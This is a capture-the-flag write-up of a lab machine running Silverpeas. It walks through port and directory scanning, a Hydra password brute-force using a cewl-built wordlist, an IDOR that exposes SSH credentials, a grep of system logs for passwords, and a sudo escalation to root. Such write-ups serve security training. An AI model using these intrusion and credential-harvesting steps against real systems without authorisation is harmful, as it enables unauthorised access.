{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Let's begin by scanning all the ports.")}}

{{console("nmap -sC -p- 10.10.6.60", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 15:23 CET
Warning: 10.10.6.60 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.6.60
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
|_http-title: Error

Nmap done: 1 IP address (1 host up) scanned in 218.74 seconds")}}

{{text("We find 3 open ports.")}}

{{list(['22 (SSH)', '80 (HTTP)', '8080 (HTTP)'])}}

{{text("Upon visiting the web server, we are presented with a page for a organization that improves cybersecurity measures.")}}

{{image("../../static/writeups/silverplatter/images/000001.jpg")}}

{{text("Under 'Contact' we can find information about a project manager on 'Silverpeas' whose username is 'scr1ptkiddy'.")}}

{{text("I couldn't find anything more on this port, so let's visit the website on port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>8080</code>.")}}

{{image("../../static/writeups/silverplatter/images/000002.jpg")}}

{{text("We find nothing but a 404 error page. I wonder if directory enumerating will get us something.")}}

{{console("gobuster dir -u http://10.10.6.60:8080 -w /usr/share/wordlists/dirb/big.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.6.60:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
/website              (Status: 302) [Size: 0] [--> http://10.10.6.60:8080/website/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================")}}

{{text("Going through these directories also didn't yield any interesting results.")}}

{{text("I remembered that little piece of information about a project manager on 'Silverpeas' so I tried to enter that into the URL.")}}

{{image("../../static/writeups/silverplatter/images/000003.jpg")}}

{{text("I was right and now we have got a login panel.")}}

{{header("Web Access", "web-access")}}

{{text("Since we know the username is 'scr1ptkiddy', we probably have to brute-force the password now.")}}

{{text("You can use a tool like <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Hydra</code> or <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Burp Suite</code> to do so.")}}

{{text("By catching a log in request with Burp, I was able to craft a command we can use to brute-force the password.")}}

{{console("hydra -l scr1ptkiddy -P /usr/share/wordlists/rockyou.txt 10.10.6.60 -s 8080 http-post-form \"/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect\"")}}

{{text("But the command was taking awfully long, so I knew something is wrong. Then I finally read the room description.")}}

{{text("<code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are)</code>")}}

{{text("So that was the problem. We probably need to create our own wordlist to get the password.")}}

{{text("We can do so with a tool named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cewl</code>.")}}

{{text("We run it on the web page from before, and use it as the password list while brute-forcing.")}}

{{console("cewl http://10.10.6.60 > passwords.txt")}}

{{image("../../static/writeups/silverplatter/images/000004.jpg")}}

{{text("Now we can log in using the found password.")}}

{{image("../../static/writeups/silverplatter/images/000005.jpg")}}

{{header("Shell as tim", "shell-as-tim")}}

{{text("We can notice that we have an unread notification. Let's check if it's something important.")}}

{{image("../../static/writeups/silverplatter/images/000006.jpg")}}

{{text("Sadly, the message isn't going to help us, but I noticed something wrong in the URL.")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>?ID=5</code> parameter probably means that it's  the fifth message in the database. I wonder if we can read other messages upon changing the number.")}}

{{text("I catch the request using Burp and change the ID to 6.")}}

{{image("../../static/writeups/silverplatter/images/000007.jpg")}}

{{text("Now we can log in using SSH thanks to the obtained credentials.")}}

{{header("Shell as tyler", "shell-as-tyler")}}

{{text("While logged in as user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tim</code> we check what groups we belong to.")}}

{{console("id", "uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>adm</code> group is mostly used for system monitoring, which means we probably can read all the logs on the machine.")}}

{{text("We can use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>grep</code> to search recursively for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>password</code> phrase in the logs.")}}

{{console("grep -ri \"password\" /var/log 2>/dev/null", "...
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=[REDACTED] -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
...")}}

{{text("Now with a password, let's find a place to use it. I checked the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code> file and found a user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tyler</code>.")}}

{{text("We use the found password to log in as the new user and it works.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since we know our password, let's check our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL")}}

{{text("Wow. We can run any command as any user. In such case we can simply change our user to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>root</code> and read the flag.")}}

{{image("../../static/writeups/silverplatter/images/000008.jpg")}}

{{script()}}